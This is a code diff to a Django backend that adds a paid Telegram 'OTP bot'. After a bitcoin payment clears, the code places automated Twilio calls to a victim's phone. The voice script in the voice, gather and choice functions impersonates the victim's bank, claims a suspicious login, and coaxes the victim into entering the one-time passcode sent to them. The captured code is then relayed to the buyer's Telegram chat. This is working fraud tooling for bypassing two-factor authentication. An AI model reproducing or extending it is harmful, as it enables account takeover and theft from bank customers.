@@ -3,8 +3,8 @@ from rest_framework.response import Response
 from rest_framework.decorators import authentication_classes
 from rest_framework.permissions import IsAuthenticated, AllowAny
 from rest_framework import status
-from .models import Balance, Product, Invoice, Telegram_Client
-from .utils import  exchanged_rate, send_mail, update_admins, update_user_2, update_user_3, cards_mail, update_user, main
+from .models import Balance, Product, Invoice, Telegram_Client,Telegram_Otp_bot
+from .utils import  exchanged_rate, send_mail, update_admins, update_user_2, update_user_3, cards_mail, update_user, main, call
 import requests
 import uuid
 from rest_framework.authentication import BasicAuthentication, SessionAuthentication, TokenAuthentication
@@ -12,7 +12,9 @@ from .models import Balance
 from .serializers import BalanceSerializer,Telegram_ClientSerializer
 from store.serializers import ProductSerializer
 from rest_framework.generics import CreateAPIView
-from asgiref.sync import sync_to_async,async_to_sync
+from asgiref.sync import async_to_sync
+from django.http import HttpResponse
+from twilio.twiml.voice_response import VoiceResponse, Gather
 
 
 class BalanceListView(APIView):
@@ -307,4 +309,165 @@ class TelegrambaseWebhookView(APIView):
                     return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                 
                 return Response({'message': 'Balance update failed'},status=400)
+
+class TelegramOtpBotCreateView(CreateAPIView):
+    serializer_class = Telegram_ClientSerializer
+    permission_classes = [AllowAny]
+
+    def create(self, request, *args, **kwargs):
+        chat_id = request.data.get('chat_id')
+        try:
+            client = Telegram_Otp_bot.objects.get(chat_id=chat_id)
+            if 'address' in request.data and 'number' in request.data:
+                client.address = request.data['address']
+                client.number = request.data['number']
+                client.save()
+                return Response({'message': 'Address updated'}, status=status.HTTP_200_OK)
+            elif 'name' in request.data:
+                client.name = request.data['name']
+                client.save()
+                return Response({'message': 'name updated'}, status=status.HTTP_200_OK)
+            elif client:
+                return Response({'message': 'Client already exists'}, status=status.HTTP_400_BAD_REQUEST)
+        except Telegram_Client.DoesNotExist:
+            return super().create(request, *args, **kwargs)
+
+class TelegrambotWebhookView(APIView):
+    permission_classes = [AllowAny]
+    def get(self,request):
+        if request.method == 'GET':
+            txid = request.GET.get('txid')
+            value = float(request.GET.get('value'))
+            status = request.GET.get('status')
+            addr = request.GET.get('addr')
+            otp_bot = Telegram_Otp_bot.objects.get(address=addr)
+            chat_id = otp_bot.chat_id
+            phone_number = otp_bot.number
+            bank = otp_bot.name
+            if int(status) == 2:
+                
+                # update user's balance
+                received = float(value)
+                url = "https://www.blockonomics.co/api/price?currency=USD"
+                response = requests.get(url)
+                if response.text:
+                    response_json = response.json()
+                    usdvalue = received / 1e8 * response_json["price"]
+                else:
+                    # Handle the case where the response is empty
+                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+                if otp_bot.log:
+                    if usdvalue >= 24.6:
+                        text = f"Placing call to {phone_number}...."
+                        async_to_sync(main)(chat_id,text)
+                        call(phone_number)
+                    else:
+                        balance = 25-usdvalue
+                        text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
+                        async_to_sync(main)(chat_id,text)
+                else:
+                    if usdvalue >= 14.6:
+                        text = f"Placing call to {phone_number}...."
+                        async_to_sync(main)(chat_id,text)
+                        call(phone_number,bank)
+                    else:
+                        balance = 15-usdvalue
+                        text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
+                        async_to_sync(main)(chat_id,text)
+                return Response({'message': 'message sent'},status=200)
+            elif int(status) == 0:
+                url = "https://www.blockonomics.co/api/price?currency=USD"
+                response = requests.get(url)
+                if response.text:
+                    response_json = response.json()
+                    usdvalue = value / 1e8 * response_json["price"]
+                else:
+                    # Handle the case where the response is empty
+                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+                text = "Payment initialized successfully, waiting for confirmation from the blockchain...."
+                telgram=async_to_sync(main)(chat_id,text)
+                return Response({'message': 'Transaction started','telegram':telgram},status=200)
+            elif int(status) == 1:
+                received = float(value)
+                url = "https://www.blockonomics.co/api/price?currency=USD"
+                response = requests.get(url)
+                if response.text:
+                    response_json = response.json()
+                    usdvalue = value / 1e8 * response_json["price"]
+                else:
+                    # Handle the case where the response is empty
+                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+                text = "Payment partially confirmed, waiting for last set of confirmation from the blockchain...."
+                async_to_sync(main)(chat_id,text)
+                return Response({'message': 'Balance update partial'},status=200)
+            else:
+                received = float(value)
+                url = "https://www.blockonomics.co/api/price?currency=USD"
+                response = requests.get(url)
+                if response.text:
+                    response_json = response.json()
+                    usdvalue = value / 1e8 * response_json["price"]
+                else:
+                    # Handle the case where the response is empty
+                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+                
+                return Response({'message': 'Balance update failed'},status=400)
+
+
+
+def voice(request,bank,chat_id):
+    resp = VoiceResponse()
+    gather = Gather(num_digits=1, action=f'/gather/{chat_id}/')
+    gather.say(f'We have received a login request on your {bank} account. If you did not request an OTP Press 1.')
+    resp.append(gather)
+
+    # If the user doesn't select an option, redirect them into a loop
+    resp.redirect(f'/voice/{bank}/')
+
+    return HttpResponse(str(resp))
+
+def gather(request,chat_id,bank):
+    # Processes results from the <Gather> prompt in /voice
+    # Start our TwiML response
+    resp = VoiceResponse()
+
+    # If Twilio's request to our app included already gathered digits,
+    # process them
+    if 'Digits' in request.POST:
+        # Get which digit the caller chose
+        choice = request.POST['Digits']
+
+        # <Say> a different message depending on the caller's choice
+        if choice == '1':
+            gather = Gather(action=f'/gather/{chat_id}/')
+            gather.say('We need to confirm your identity first before blocking this request. Enter the pin code sent to your phone number.')
+            resp.append(gather)
+        elif len(choice) > 3:
+            gather = Gather(action=f'/otp/{chat_id}/')
+            resp.say(f"You have entered {choice}. Press 1 to confirm, or press 2 to re-enter")
+            resp.append(gather)
             
+        else:
+            # If the caller didn't choose 1 or 2, apologize and ask them again
+            resp.say("Sorry, Please press 1 if you did not request for the Pin Code.")
+
+    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
+    resp.redirect(f'/voice/{bank}/')
+
+    return HttpResponse(str(resp))
+
+def choice(request, chat_id):
+    resp = VoiceResponse()
+
+    if 'Digits' in request.POST:
+        pin = request.POST['Digits']
+
+        if pin[:-1] == '1':
+            text = f'The OTP code inputed by the user is {pin}✅'
+            main(chat_id,text)
+            resp.say("Thank you for your cooperation. The suspicious login has been blocked.")
+        
+        elif pin[:-1] == '2':
+            resp.redirect(f"/gather/{chat_id}/")
+
+    return HttpResponse(str(resp))
